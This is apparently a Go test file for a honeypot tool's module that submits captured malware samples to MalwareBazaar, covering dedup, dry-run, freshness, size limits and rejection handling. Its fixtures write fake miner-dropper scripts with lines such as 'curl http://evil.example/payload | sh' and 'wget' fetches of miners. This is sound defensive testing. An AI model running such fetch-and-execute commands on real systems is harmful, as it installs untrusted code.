package bazaar

import (
	"context"
	"errors"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"
)

// memRecorder is an in-memory UploadRecorder for tests. The real
// implementation lives in cmd/shardlure/share.go and wraps the
// sqlite store; replicating that here would re-test sqlite, not
// the Share logic.
type memRecorder struct {
	mu      sync.Mutex
	seen    map[string]bool
	records []struct {
		sha, status, url string
		at               time.Time
	}
}

func newMemRecorder() *memRecorder { return &memRecorder{seen: map[string]bool{}} }

func (m *memRecorder) BazaarUploadRecorded(sha string) (bool, error) {
	m.mu.Lock()
	defer m.mu.Unlock()
	return m.seen[sha], nil
}

func (m *memRecorder) RecordBazaarUpload(sha, status, url string, at time.Time) error {
	m.mu.Lock()
	defer m.mu.Unlock()
	m.seen[sha] = true
	m.records = append(m.records, struct {
		sha, status, url string
		at               time.Time
	}{sha, status, url, at})
	return nil
}

// TestShareUploadsAndRecords verifies the full happy path: candidate
// is on disk, MalwareBazaar returns inserted, the recorder is told,
// and the next call short-circuits via dedup.
func TestShareUploadsAndRecords(t *testing.T) {
	dir := t.TempDir()
	samplePath := filepath.Join(dir, "sample.bin")
	// A RedTail dropper script fetched in-session: passes Vet (fresh, malware
	// family, fetched origin). The test is about the upload/dedup pipeline, so
	// the candidate must clear the submission-policy gate.
	if err := os.WriteFile(samplePath, []byte("#!/bin/bash\n# redtail miner installer\ncd /tmp && wget http://x/redtail\n"), 0o600); err != nil {
		t.Fatal(err)
	}

	var calls int
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		calls++
		_, _ = w.Write([]byte(`{"query_status": "inserted"}`))
	}))
	defer srv.Close()

	rec := newMemRecorder()
	c := []Candidate{{
		SHA256:     "aa11bb22cc33",
		LocalPath:  samplePath,
		SizeBytes:  70,
		CreatedAt:  time.Now(),
		Origin:     "cowrie_download",
		ObservedAt: time.Now(),
	}}
	opts := Options{
		APIKey:    "k",
		Endpoint:  srv.URL,
		ExtraTags: []string{"shardlure", "honeypot"},
		MaxBytes:  1 << 20,
		RateLimit: time.Millisecond, // don't slow the test
	}
	uploaded, skipped, err := Share(context.Background(), rec, c, opts)
	if err != nil {
		t.Fatalf("Share: %v", err)
	}
	if uploaded != 1 || skipped != 0 {
		t.Errorf("first run: want (1,0), got (%d,%d)", uploaded, skipped)
	}
	if len(rec.records) != 1 || rec.records[0].status != "inserted" {
		t.Errorf("recorder: want 1 inserted, got %+v", rec.records)
	}

	// Second run: candidate is the same, should be skipped without
	// hitting the network.
	prevCalls := calls
	uploaded, skipped, err = Share(context.Background(), rec, c, opts)
	if err != nil {
		t.Fatalf("Share #2: %v", err)
	}
	if uploaded != 0 || skipped != 1 {
		t.Errorf("second run: want (0,1), got (%d,%d)", uploaded, skipped)
	}
	if calls != prevCalls {
		t.Errorf("dedup failed: network was hit again")
	}
}

// TestShareDryRunSkipsNetwork ensures --dry-run never hits the
// endpoint and never records. Critical: a dry-run that uploaded by
// accident would be a serious bug since the sample becomes public.
func TestShareDryRunSkipsNetwork(t *testing.T) {
	dir := t.TempDir()
	p := filepath.Join(dir, "x")
	// Write a plausible shell dropper (>= minSampleBytes=64 bytes).
	_ = os.WriteFile(p, []byte("#!/bin/sh\ncurl http://evil.example/payload | sh\n"+
		"# padding to hit 64 bytes for Vet minimum size gate xxxxxxxxxxxx\n"), 0o600)

	hit := false
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		hit = true
		_, _ = w.Write([]byte(`{"query_status": "inserted"}`))
	}))
	defer srv.Close()

	rec := newMemRecorder()
	cand := Candidate{
		SHA256:     "abc",
		LocalPath:  p,
		SizeBytes:  128,
		Origin:     "cowrie_download",
		ObservedAt: time.Now().Add(-1 * time.Hour),
		CreatedAt:  time.Now(),
	}
	var sawDryRun bool
	uploaded, _, err := Share(context.Background(), rec, []Candidate{cand}, Options{
		Endpoint:  srv.URL,
		MaxBytes:  1 << 20,
		DryRun:    true,
		RateLimit: time.Millisecond,
		OnProgress: func(_ Candidate, _ Classification, r *Result, _ error) {
			if r != nil && r.Status == "dry-run" {
				sawDryRun = true
			}
		},
	})
	if err != nil {
		t.Fatalf("Share: %v", err)
	}
	if hit {
		t.Errorf("dry-run hit the network endpoint")
	}
	if uploaded != 0 {
		t.Errorf("dry-run reported uploads: %d", uploaded)
	}
	if len(rec.records) != 0 {
		t.Errorf("dry-run recorded: %v", rec.records)
	}
	if !sawDryRun {
		t.Errorf("candidate never reached the dry-run gate (rejected earlier)")
	}
}

func TestShareHardCapsFreshnessBeforeNetwork(t *testing.T) {
	dir := t.TempDir()
	p := filepath.Join(dir, "old-dropper.sh")
	payload := []byte("#!/bin/sh\ncurl http://evil.example/payload | sh\n" +
		"# padding to clear the minimum sample-size policy gate xxxxxxxxxxxx\n")
	if err := os.WriteFile(p, payload, 0o600); err != nil {
		t.Fatal(err)
	}

	var calls atomic.Int32
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		calls.Add(1)
		t.Error("12-day-old sample reached the network")
		_, _ = w.Write([]byte(`{"query_status": "inserted"}`))
	}))
	defer srv.Close()

	rec := newMemRecorder()
	var progressReason string
	uploaded, skipped, err := Share(context.Background(), rec, []Candidate{{
		SHA256:     "old-sample",
		LocalPath:  p,
		SizeBytes:  int64(len(payload)),
		CreatedAt:  time.Now(),
		Origin:     "cowrie_download",
		ObservedAt: time.Now().Add(-12 * 24 * time.Hour),
	}}, Options{
		APIKey:        "k",
		Endpoint:      srv.URL,
		MaxBytes:      1 << 20,
		FreshnessDays: 30,
		RateLimit:     time.Millisecond,
		OnProgress: func(_ Candidate, _ Classification, result *Result, err error) {
			if result != nil && result.Status == "skipped" && err != nil {
				progressReason = err.Error()
			}
		},
	})
	if err != nil {
		t.Fatalf("Share: %v", err)
	}
	if uploaded != 0 || skipped != 1 {
		t.Errorf("want (uploaded=0, skipped=1), got (%d,%d)", uploaded, skipped)
	}
	if got := calls.Load(); got != 0 {
		t.Errorf("network calls = %d, want 0", got)
	}
	if len(rec.records) != 0 {
		t.Errorf("stale sample was recorded: %v", rec.records)
	}
	if !strings.Contains(progressReason, "10-day") {
		t.Errorf("progress reason %q should mention hard 10-day policy", progressReason)
	}
}

func TestShareSkipsUnprovenExecutableBeforeNetwork(t *testing.T) {
	dir := t.TempDir()
	p := filepath.Join(dir, "manual.exe")
	payload := []byte("MZ" + strings.Repeat("x", 128))
	if err := os.WriteFile(p, payload, 0o600); err != nil {
		t.Fatal(err)
	}

	var calls atomic.Int32
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		calls.Add(1)
		t.Error("unproven PE sample reached the network")
		_, _ = w.Write([]byte(`{"query_status": "inserted"}`))
	}))
	defer srv.Close()

	rec := newMemRecorder()
	var progressStatus, progressReason string
	var progressClass Classification
	uploaded, skipped, err := Share(context.Background(), rec, []Candidate{{
		SHA256:     "manual-mz-sample",
		LocalPath:  p,
		SizeBytes:  int64(len(payload)),
		CreatedAt:  time.Now(),
		Origin:     "manual",
		ObservedAt: time.Now().Add(-time.Hour),
	}}, Options{
		APIKey:        "k",
		Endpoint:      srv.URL,
		MaxBytes:      1 << 20,
		FreshnessDays: 10,
		RateLimit:     time.Millisecond,
		OnProgress: func(_ Candidate, cls Classification, result *Result, err error) {
			progressClass = cls
			if result != nil {
				progressStatus = result.Status
			}
			if err != nil {
				progressReason = err.Error()
			}
		},
	})
	if err != nil {
		t.Fatalf("Share: %v", err)
	}
	if uploaded != 0 || skipped != 1 {
		t.Errorf("want (uploaded=0, skipped=1), got (%d,%d)", uploaded, skipped)
	}
	if got := calls.Load(); got != 0 {
		t.Errorf("network calls = %d, want 0", got)
	}
	if len(rec.records) != 0 {
		t.Errorf("unproven sample was recorded: %v", rec.records)
	}
	if progressStatus != "skipped" || !strings.Contains(progressReason, "unconfirmed") {
		t.Errorf("progress = (status=%q, reason=%q), want skipped/unconfirmed", progressStatus, progressReason)
	}
	if progressClass.FileKind != "PE executable" || !containsTag(progressClass.Tags, "exe") {
		t.Errorf("classification metadata lost: %+v", progressClass)
	}
}

// TestShareSkipsOversize asserts the size cap is honoured client-side
// so we never embarrass ourselves by sending a 4 GB cowrie sftp blob
// to abuse.ch.
func TestShareSkipsOversize(t *testing.T) {
	dir := t.TempDir()
	p := filepath.Join(dir, "big")
	_ = os.WriteFile(p, []byte("x"), 0o600)

	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		t.Errorf("oversized sample reached the endpoint")
	}))
	defer srv.Close()

	rec := newMemRecorder()
	uploaded, skipped, err := Share(context.Background(), rec, []Candidate{{
		SHA256: "abc", LocalPath: p, SizeBytes: 1024 * 1024 * 1024, // 1 GiB
		CreatedAt: time.Now(),
	}}, Options{APIKey: "k", Endpoint: srv.URL, MaxBytes: 1 << 20, RateLimit: time.Millisecond})
	if err != nil {
		t.Fatalf("Share: %v", err)
	}
	if uploaded != 0 || skipped != 1 {
		t.Errorf("want (0,1), got (%d,%d)", uploaded, skipped)
	}
}

// TestShareFatalRejectionStops verifies that a "user_blacklisted"
// response halts the run instead of continuing through the batch
// (which would amount to ddosing the abuse.ch endpoint).
func TestShareFatalRejectionStops(t *testing.T) {
	dir := t.TempDir()
	p := filepath.Join(dir, "x")
	// Must clear Vet so it reaches the network (that's what this test checks).
	_ = os.WriteFile(p, []byte("#!/bin/sh\n# xmrig miner dropper\nwget http://x/xmrig\n"), 0o600)

	calls := 0
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		calls++
		_, _ = w.Write([]byte(`{"query_status": "user_blacklisted"}`))
	}))
	defer srv.Close()

	rec := newMemRecorder()
	fresh := time.Now()
	cands := []Candidate{
		{SHA256: "a", LocalPath: p, SizeBytes: 70, CreatedAt: fresh, Origin: "cowrie_download", ObservedAt: fresh},
		{SHA256: "b", LocalPath: p, SizeBytes: 70, CreatedAt: fresh, Origin: "cowrie_download", ObservedAt: fresh},
		{SHA256: "c", LocalPath: p, SizeBytes: 70, CreatedAt: fresh, Origin: "cowrie_download", ObservedAt: fresh},
	}
	_, _, err := Share(context.Background(), rec, cands, Options{
		APIKey:    "k",
		Endpoint:  srv.URL,
		MaxBytes:  1 << 20,
		RateLimit: time.Millisecond,
	})
	if err == nil {
		t.Fatalf("expected fatal error for user_blacklisted")
	}
	if calls != 1 {
		t.Errorf("want 1 call before halt, got %d", calls)
	}
}

func TestShareSemanticRejections(t *testing.T) {
	tests := []struct {
		status    string
		wantCalls int32
		fatal     bool
	}{
		{status: "no_api_key", wantCalls: 1, fatal: true},
		{status: "user_blacklisted", wantCalls: 1, fatal: true},
		{status: "http_post_expected", wantCalls: 2},
		{status: "file_expected", wantCalls: 2},
		{status: "file_too_large", wantCalls: 2},
		{status: "file_type_not_allowed", wantCalls: 2},
		{status: "", wantCalls: 2},
		{status: "future_status", wantCalls: 2},
	}

	for _, tt := range tests {
		name := tt.status
		if name == "" {
			name = "empty"
		}
		t.Run(name, func(t *testing.T) {
			payload := []byte("#!/bin/sh\n# xmrig miner dropper\nwget http://example.test/xmrig\n" + strings.Repeat("# padding\n", 8))
			path := filepath.Join(t.TempDir(), "dropper.sh")
			if err := os.WriteFile(path, payload, 0o600); err != nil {
				t.Fatal(err)
			}

			var calls atomic.Int32
			srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
				calls.Add(1)
				_, _ = w.Write([]byte(`{"query_status":` + strconv.Quote(tt.status) + `}`))
			}))
			defer srv.Close()

			fresh := time.Now()
			cands := []Candidate{
				{SHA256: "a", LocalPath: path, SizeBytes: int64(len(payload)), CreatedAt: fresh, Origin: "cowrie_download", ObservedAt: fresh},
				{SHA256: "b", LocalPath: path, SizeBytes: int64(len(payload)), CreatedAt: fresh, Origin: "cowrie_download", ObservedAt: fresh},
			}
			rec := newMemRecorder()
			uploaded, skipped, err := Share(context.Background(), rec, cands, Options{
				APIKey: "k", Endpoint: srv.URL, MaxBytes: 1 << 20, RateLimit: time.Millisecond,
			})
			if err == nil {
				t.Fatalf("semantic rejection %q returned nil error", tt.status)
			}
			if uploaded != 0 || skipped != int(tt.wantCalls) {
				t.Fatalf("counts = (%d uploaded, %d skipped), want (0, %d)", uploaded, skipped, tt.wantCalls)
			}
			if got := calls.Load(); got != tt.wantCalls {
				t.Fatalf("calls = %d, want %d for status %q", got, tt.wantCalls, tt.status)
			}
			if tt.status != "" && !strings.Contains(err.Error(), tt.status) {
				t.Fatalf("error %q does not identify status %q", err, tt.status)
			}
			var semanticErr *SemanticError
			if !errors.As(err, &semanticErr) {
				t.Fatalf("error %T is not *SemanticError: %v", err, err)
			}
			if semanticErr.Status != tt.status || semanticErr.Fatal() != tt.fatal {
				t.Fatalf("semantic error = (status=%q fatal=%v), want (%q, %v)", semanticErr.Status, semanticErr.Fatal(), tt.status, tt.fatal)
			}
			if len(rec.records) != 0 {
				t.Fatalf("rejected samples were recorded: %+v", rec.records)
			}
		})
	}
}

func TestShareFatalSemanticRejectionRetainedAfterPriorError(t *testing.T) {
	payload := []byte("#!/bin/sh\n# xmrig miner dropper\nwget http://example.test/xmrig\n" + strings.Repeat("# padding\n", 8))
	path := filepath.Join(t.TempDir(), "dropper.sh")
	if err := os.WriteFile(path, payload, 0o600); err != nil {
		t.Fatal(err)
	}

	var calls atomic.Int32
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		if calls.Add(1) == 1 {
			http.Error(w, "prior transport failure", http.StatusBadGateway)
			return
		}
		_, _ = w.Write([]byte(`{"query_status":"no_api_key"}`))
	}))
	defer srv.Close()

	fresh := time.Now()
	cands := []Candidate{
		{SHA256: "transport-error", LocalPath: path, SizeBytes: int64(len(payload)), CreatedAt: fresh, Origin: "cowrie_download", ObservedAt: fresh},
		{SHA256: "fatal-rejection", LocalPath: path, SizeBytes: int64(len(payload)), CreatedAt: fresh, Origin: "cowrie_download", ObservedAt: fresh},
	}
	rec := newMemRecorder()
	uploaded, skipped, err := Share(context.Background(), rec, cands, Options{
		APIKey: "k", Endpoint: srv.URL, MaxBytes: 1 << 20, RateLimit: time.Millisecond,
	})
	if uploaded != 0 || skipped != 1 {
		t.Fatalf("counts = (%d uploaded, %d skipped), want (0, 1)", uploaded, skipped)
	}
	if got := calls.Load(); got != 2 {
		t.Fatalf("calls = %d, want 2", got)
	}
	if err == nil || !strings.Contains(err.Error(), "http 502") {
		t.Fatalf("error = %v, want prior transport error", err)
	}
	var semanticErr *SemanticError
	if !errors.As(err, &semanticErr) || semanticErr.Status != "no_api_key" || !semanticErr.Fatal() {
		t.Fatalf("error = %v, want fatal no_api_key SemanticError", err)
	}
	if len(rec.records) != 0 {
		t.Fatalf("rejected samples were recorded: %+v", rec.records)
	}
}

func TestSharePacesAfterNonfatalSemanticRejection(t *testing.T) {
	payload := []byte("#!/bin/sh\n# xmrig miner dropper\nwget http://example.test/xmrig\n" + strings.Repeat("# padding\n", 8))
	path := filepath.Join(t.TempDir(), "dropper.sh")
	if err := os.WriteFile(path, payload, 0o600); err != nil {
		t.Fatal(err)
	}

	var calls atomic.Int32
	var timesMu sync.Mutex
	var requestTimes []time.Time
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		call := calls.Add(1)
		timesMu.Lock()
		requestTimes = append(requestTimes, time.Now())
		timesMu.Unlock()
		if call == 1 {
			_, _ = w.Write([]byte(`{"query_status":"file_too_large"}`))
			return
		}
		_, _ = w.Write([]byte(`{"query_status":"inserted"}`))
	}))
	defer srv.Close()

	fresh := time.Now()
	cands := []Candidate{
		{SHA256: "rejected", LocalPath: path, SizeBytes: int64(len(payload)), CreatedAt: fresh, Origin: "cowrie_download", ObservedAt: fresh},
		{SHA256: "accepted", LocalPath: path, SizeBytes: int64(len(payload)), CreatedAt: fresh, Origin: "cowrie_download", ObservedAt: fresh},
	}
	rec := newMemRecorder()
	const rateLimit = 25 * time.Millisecond
	uploaded, skipped, err := Share(context.Background(), rec, cands, Options{
		APIKey: "k", Endpoint: srv.URL, MaxBytes: 1 << 20, RateLimit: rateLimit,
	})
	var semanticErr *SemanticError
	if !errors.As(err, &semanticErr) || semanticErr.Status != "file_too_large" {
		t.Fatalf("error = %v, want file_too_large SemanticError", err)
	}
	if uploaded != 1 || skipped != 1 {
		t.Errorf("counts = (%d uploaded, %d skipped), want (1, 1)", uploaded, skipped)
	}
	if len(rec.records) != 1 || rec.records[0].sha != "accepted" {
		t.Errorf("records = %+v, want only accepted candidate", rec.records)
	}
	timesMu.Lock()
	times := append([]time.Time(nil), requestTimes...)
	timesMu.Unlock()
	if len(times) != 2 {
		t.Fatalf("request times = %v, want two POSTs", times)
	}
	if gap := times[1].Sub(times[0]); gap < rateLimit {
		t.Errorf("inter-request gap = %v, want at least %v", gap, rateLimit)
	}
}

// TestShareMissingAPIKey checks the early-exit guard.
func TestShareMissingAPIKey(t *testing.T) {
	_, _, err := Share(context.Background(), newMemRecorder(), []Candidate{{SHA256: "a", LocalPath: "/dev/null", SizeBytes: 1}}, Options{})
	if err != ErrMissingAPIKey {
		t.Fatalf("want ErrMissingAPIKey, got %v", err)
	}
}
